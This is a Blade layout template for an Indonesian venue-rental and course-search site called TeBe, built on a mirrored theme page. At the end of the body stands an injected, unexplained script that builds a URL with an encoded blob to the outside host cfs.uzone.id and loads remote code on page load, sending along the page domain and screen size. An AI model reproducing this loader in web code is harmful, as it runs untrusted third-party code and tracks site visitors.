<!DOCTYPE html>

<!-- Mirrored from www.vasterad.com/themes/findeo/agent-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 10 Jan 2017 00:41:48 GMT -->
<head>

<!-- Basic Page Needs
================================================== -->
<title>TeBe</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<!-- CSS
================================================== -->
<link rel="stylesheet" href="{{url('/css/style.css')}}">
<link rel="stylesheet" href="{{url('/css/colors/main.css')}}" id="colors">
<link rel="stylesheet" type="text/css" media="screen" href="{{url('/css/bootstrap-datetimepicker.min.css')}}">

</head>

<body>

<!-- Wrapper -->
<div id="wrapper">


<!-- Header Container
================================================== -->
<header id="header-container">

	<!-- Topbar -->
	<div id="top-bar">
		<div class="container">

			<!-- Left Side Content -->
			<div class="left-side">

				<!-- Top bar -->
				<ul class="top-bar-menu">
					@if(!Request::is('masuk_daftar') && Auth::check())
					<li><i class="fa fa-user"></i><a href="{{url('/profil')}}"> {{ Auth::user()->name }} </a></li>
					<li><i class="fa fa-phone"></i> {{ Auth::user()->telepon }} </li>
					<li><i class="fa fa-envelope"></i> {{ Auth::user()->email }} </li>
				@endif
				</ul>

			</div>
			<!-- Left Side Content / End -->


			<!-- Left Side Content -->
			<div class="right-side">

				<!-- Social Icons -->
				<ul class="social-icons">
					<li><a class="facebook" href="#"><i class="icon-facebook"></i></a></li>
					<li><a class="instagram" href="#"><i class="im im-icon-Instagram"></i></a></li>
					<li><a class="gplus" href="#"><i class="icon-gplus"></i></a></li>
				</ul>

			</div>
			<!-- Left Side Content / End -->

		</div>
	</div>
	<div class="clearfix"></div>
	<!-- Topbar / End -->


	<!-- Header -->
	<div id="header">
		<div class="container">

			<!-- Left Side Content -->
			<div class="left-side">

				<!-- Logo -->
				<div id="logo">
					<a href="#"><img src="{{url('/images/logo.png')}}" alt=""></a>
				</div>


				<!-- Mobile Navigation -->
				<div class="menu-responsive">
					<i class="fa fa-reorder menu-trigger"></i>
				</div>


				<!-- Main Navigation -->
				<nav id="navigation" class="style-1">
					<ul id="responsive">

						<li><a href="{{url('/')}}">Home</a>
						</li>

						<!-- @if(!Request::is('masuk_daftar'))
						<li><a href="/profil">Profil</a></li>
						@endif -->

						<li><a class="current" href="#">Cari</a>
							<ul>
								<li><a href="{{url('/caritempat')}}">Tempat</a></li>
								<li><a href="{{url('/carikursus')}}">Kursus</a></li>
							</ul>
						</li>
					</ul>
				</nav>
				<div class="clearfix"></div>
				<!-- Main Navigation / End -->

			</div>
			<!-- Left Side Content / End -->

			<!-- Right Side Content / End -->
			<div class="right-side">
				<!-- Header Widget -->
				<!-- <div class="header-widget">
					@if(!Request::is('masuk_daftar'))
					<a href="sub_properti" class="button border"><span class="im im-icon-Add"></span>&nbsp;Tambah Properti</a>
					@elseif(!Request::is('sub_properti'))
					<a href="sub_properti" class="button border"><span class="im im-icon-Add"></span>&nbsp;Tambah Properti</a>
					@endif
				</div> -->
				<!-- Header Widget / End -->
			</div>
			<!-- Right Side Content / End -->

		</div>
	</div>
	<!-- Header / End -->

</header>
<div class="clearfix"></div>
<!-- Header Container / End -->
@yield('content')
<!-- Footer
================================================== -->
<div class="margin-top-55"></div>

<div id="footer" class="sticky-footer">
	<!-- Main -->
	<div class="container">
		<div class="row">
			<div class="col-md-5 col-sm-6">
				<img class="footer-logo" src="{{url('/images/logo.png')}}" alt="">
				<br><br>
				<p>TeBe adalah aplikasi dimana kita dapat menyewa tempat atau mengikuti kursus terdekat.</p>
			</div>


			<div class="col-md-3  col-sm-12">
				<h4>Contact Us</h4>
				<div class="text-widget">
					<span>Jakarta Selatan</span> <br>
					Phone: <span>(123) 123-456 </span><br>
					E-Mail:<span> <a href="#"><span class="__cf_email__" data-cfemail="83ece5e5eae0e6c3e6fbe2eef3efe6ade0ecee">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a> </span><br>
				</div>
			</div>

		</div>

		<!-- Copyright -->
		<div class="row">
			<div class="col-md-12">
				<div class="copyrights">© 2016 Tebe. All Rights Reserved.</div>
			</div>
		</div>

	</div>

</div>
<!-- Footer / End -->


<!-- Back To Top Button -->
<div id="backtotop"><a href="#"></a></div>


<!-- Scripts
================================================== -->
<script
  src="https://code.jquery.com/jquery-2.2.4.min.js"
  integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
  crossorigin="anonymous"></script>
	<script type="text/javascript" src="{{url('/scripts/chosen.min.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/magnific-popup.min.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/owl.carousel.min.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/rangeSlider.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/sticky-kit.min.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/slick.min.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/masonry.min.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/jquery.jpanelmenu.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/tooltips.min.js')}}"></script>
<script type="text/javascript" src="{{url('/scripts/custom.js')}}"></script>

<script type="text/javascript">
function readURL(input) {

    if (input.files && input.files[0]) {
        var reader = new FileReader();

        reader.onload = function (e) {
            $('#img-val').attr('src', e.target.result);
        }

        reader.readAsDataURL(input.files[0]);
    }
}

$(document).ready(function(){
	$("#img-input").change(function(){
		readURL(this);
	});
});
</script>


<!-- Style Switcher
================================================== -->
<script src="{{url('/scripts/switcher.js')}}"></script>
<script type="text/javascript" src="{{url('/js/bootstrap-datetimepicker.min.js')}}"></script>
@yield('scripts')
<script type="text/javascript" src="{{url('/scripts/dropzone.js')}}"></script>

<script>
$(".dropzone").dropzone({
	dictDefaultMessage: "<i class='sl sl-icon-plus'></i> Click here or drop files to upload",
});
</script>

</div>
<!-- Wrapper / End -->


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK5nqBLRcTUT1CGx2rnbY%2b0lbObDSJCRp2a0d%2bl4FBCobDS87V2LO2ugawVXEWjisV0l06LBLFSV1aNmEiloSOt4qpGm1WIvQPz%2bdWFcFi7cnD9J5FeAGnox01wkbvy7pLVt4KvAFj7PEZ8YCLoIUERKfE9zOamEkCi45I3%2b6Ni1GreLFVxxq0nh%2fJ0SxB9e2C9gBDtvb%2ba5SMU74MNXh1J07JZGvSKmq24P7wy%2ftq3PrKQ60ER6g4HSwkoC34JoiH%2fmlLSUSWUUhpkEP8kxZVE9FX5zowk6fkNx8dizvMzj2W%2bj6W4YIL6vNIf8kXDpd1Gj487uJbzyk7BUh5SS9tc5z33ZVY%2f%2bhUy1uNF2DgkaeBTVIa4PniN4hJ3U5sq1EAjy4Gmtsn%2bRUn926rO7vHgeszybcdhl81EUDjHX%2fOeBZytW%2boHogFu3j9ylSkPwh7%2f0yadSat3k4vEClRe1QTDpwM9wKLx3LYlwo8PpQDTFSbp5BPf0GNjeZQr9hdqXPPvvjKGGzkkPlCQeW8Y5Esx%2bDY6dmg%2fXlB" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.vasterad.com/themes/findeo/my-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 10 Jan 2017 00:41:46 GMT -->
</html>
